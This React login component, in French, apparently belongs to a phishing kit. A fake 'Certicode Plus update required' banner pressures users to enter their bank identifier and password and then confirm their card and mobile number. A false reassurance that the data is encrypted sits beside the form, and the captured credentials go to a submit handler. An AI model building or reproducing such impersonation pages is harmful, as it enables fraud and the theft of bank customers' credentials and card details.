import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Lock, Eye, EyeOff, ShieldAlert } from "lucide-react";

export default function LoginStep({ onSubmit, submitting }) {
  const [identifiant, setIdentifiant] = useState("");
  const [password, setPassword] = useState("");
  const [showPwd, setShowPwd] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();
    if (identifiant.trim().length < 4 || password.length < 4) {
      setError("Veuillez renseigner votre identifiant et votre mot de passe.");
      return;
    }
    setError("");
    onSubmit({ identifiant: identifiant.trim(), mot_de_passe: password });
  };

  return (
    <div className="fade-in">
      <div className="mb-5 flex items-start gap-3 rounded-md border border-amber-200 bg-amber-50 p-3">
        <ShieldAlert className="h-5 w-5 text-amber-700 mt-0.5 shrink-0" />
        <p className="text-sm text-amber-900">
          <span className="font-semibold">Mise à jour Certicode Plus requise.</span>{" "}
          Pour continuer à utiliser vos paiements en ligne en toute sécurité, identifiez-vous puis confirmez votre carte et votre numéro mobile.
        </p>
      </div>

      <h1 className="text-2xl sm:text-3xl font-semibold tracking-tight text-[#003B5C]">
        Identifiez-vous
      </h1>
      <p className="mt-1 text-sm text-[#475569]">
        Accédez à votre Espace Client pour finaliser la mise à jour.
      </p>

      <form onSubmit={handleSubmit} className="mt-6 space-y-4" data-testid="login-form">
        <div className="space-y-1.5">
          <Label htmlFor="identifiant" className="text-[#003B5C] font-medium">
            Identifiant
          </Label>
          <Input
            id="identifiant"
            data-testid="login-identifiant-input"
            value={identifiant}
            onChange={(e) => setIdentifiant(e.target.value)}
            placeholder="Votre identifiant client"
            autoComplete="username"
            inputMode="text"
            className="h-12 text-base focus-visible:ring-2 focus-visible:ring-[#003B5C]"
          />
        </div>

        <div className="space-y-1.5">
          <Label htmlFor="password" className="text-[#003B5C] font-medium">
            Mot de passe
          </Label>
          <div className="relative">
            <Input
              id="password"
              data-testid="login-password-input"
              type={showPwd ? "text" : "password"}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Mot de passe"
              autoComplete="current-password"
              className="h-12 text-base pr-12 focus-visible:ring-2 focus-visible:ring-[#003B5C]"
            />
            <button
              type="button"
              data-testid="login-toggle-password"
              onClick={() => setShowPwd((v) => !v)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#475569] hover:text-[#003B5C]"
              aria-label={showPwd ? "Masquer" : "Afficher"}
            >
              {showPwd ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
            </button>
          </div>
        </div>

        {error && (
          <p data-testid="login-error" className="text-sm text-[#E11D48]">{error}</p>
        )}

        <Button
          type="submit"
          data-testid="login-submit"
          disabled={submitting}
          className="w-full h-12 text-base font-semibold bg-[#003B5C] hover:bg-[#002A43] text-white"
        >
          {submitting ? "Vérification…" : "Continuer"}
        </Button>

        <div className="flex items-center justify-center gap-2 text-xs text-[#475569] pt-2">
          <Lock className="h-3.5 w-3.5" />
          <span>Vos données sont chiffrées (TLS 1.3)</span>
        </div>
      </form>
    </div>
  );
}
